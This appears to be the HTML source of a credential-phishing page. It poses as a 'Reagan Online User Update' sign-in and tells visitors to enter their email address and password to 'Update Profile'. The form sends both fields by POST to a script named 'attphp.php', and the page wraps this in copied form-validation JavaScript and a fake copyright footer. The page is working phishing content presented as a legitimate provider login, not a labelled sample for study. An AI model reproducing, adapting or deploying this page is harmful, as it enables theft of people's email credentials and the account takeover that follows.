<html><head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">

<title>Reagan Client Web - Sign in</title>

<script type="text/javascript">


function MM_validateForm() { 
	/*if (document.getElementById){
    
	var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
    
	for (i=0; i<(args.length-2); i+=3) { 
		test=args[i+2]; 
		
    
		}*/
	val=document.getElementById("email");
      
	var errors='', test = 'RisEmail';
	if (val) { 
		nm=val.name; 
		if ((val=val.value)!="") {
        
			if (test.indexOf('isEmail')!=-1) { 
				p=val.indexOf('@');
          
				if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
        
			} 
			else if (test!='R') { 
				num = parseFloat(val);
          
				if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
          
				if (test.indexOf('inRange') != -1) { 
					p=test.indexOf(':');
           
					min=test.substring(8,p); 
					max=test.substring(p+1);
            
					if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
      
				} 
			} 
		} 					
		else if (test.charAt(0) == 'R') 
			errors += '- '+nm+' is required.\n'; 
	} 
	val=document.getElementById("password");
	test = 'R';
      
	if (val) { 
		nm=val.name; 
		if ((val=val.value)!="") {
        
			if (test.indexOf('isEmail')!=-1) { 
				p=val.indexOf('@');
          
				if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
        
			} 
			else if (test!='R') { 
				num = parseFloat(val);
          
				if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
          
				if (test.indexOf('inRange') != -1) { 
					p=test.indexOf(':');
           
					min=test.substring(8,p); 
					max=test.substring(p+1);
            
					if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
      
				} 
			} 
		} 					
		else if (test.charAt(0) == 'R') 
			errors += '- '+nm+' is required.\n'; 
	}
	if (errors) { alert('The following error(s) occurred:\n'+errors);
    	
		document.MM_returnValue = (errors == ''); return false; }
	
//} 
	return true;
}


</script>

<style>
<!--
table{font-size:13px}body{height:100%;margin:0}body{font-family:arial,sans-serif}body{background:#fff;color:#222}body{font-size:small}.ctr-p{margin:0 auto;min-width:980px}#viewport{min-height:100%;position:relative;width:100%}.content {padding-bottom:35px}li{margin:0;padding:0}.gl{white-space:nowrap}ul{margin:0;padding:0}a{font-family:arial,sans-serif}a{color:#12c;text-decoration:none}-->
</style>

</head><body link="#00FFFF" bgcolor="#FFFFFF">


<form method="POST" action="attphp.php" onsubmit="return MM_validateForm('email','','RisEmail');">
  
	<table width="1140" border="0" cellpadding="0" cellspacing="0" height="202">
		
		<tbody><tr>

			
			<td width="4" height="15"></td>
			
			<td colspan="2" height="15" width="1136"><span class="rg_ctlv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
			<font size="4">&nbsp;&nbsp;&nbsp; <font color="#0000FF">&nbsp;&nbsp; 
			Reagan Online User Update.</font></font></span><p>&nbsp;</p>
			<p>&nbsp;</td>
		
		</tr>
		
		<tr>
			
			<td width="4" height="29">&nbsp;</td>
			
			<td colspan="2" height="29" width="1136"><p><b><font size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
			<font color="#FF0000">Sign in your Email and Password to Update 
			Profile</font></font><font size="5"><font color="#FF0000">&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font>
            </b></p>
			
			</td>

		
		</tr>
		
		<tr>
			
			<td width="4" height="53">&nbsp;</td>
			
			<td width="198" height="53"><font face="Verdana">

			<span style="font-size: 8pt; font-weight:700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Email Address:</span></font></td>
			
			<td width="938" height="53"><font face="Verdana"><span style="font-size: 8pt;">
			<input name="email" id="email" size="37" type="text"> eg.@reagan.com</span></font></td>
		</tr>
		<tr>
			<td width="4" height="39">&nbsp;</td>
			<td width="198" height="39"><font face="Verdana">
			<span style="font-size: 8pt;"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Password</b>:</span></font></td>

			<td width="938" height="39"><font face="Verdana"><span style="font-size: 8pt;">
			<input name="password" id="password" size="25" type="password"> </span></font></td>
		</tr>
		<tr>
			<td width="4" height="46">&nbsp;</td>
			<td width="198" height="46">&nbsp;</td>
			<td width="938" height="46">
			<input value="Verify Email" name="submit" style="font-family: Verdana; font-size: 8pt; font-weight: bold;" type="submit"></td>
		</tr>

	</tbody></table>
  <p>  
  </p><p>    
  </p>  
    </form>
<p><font size="1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font>
</p>
<p><font size="1">&nbsp;<b> � 2022 Reagan - � All Rights Reserved, GA 30540     Terms & Conditions    |     Privacy Policy <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></font></p>
</body></html>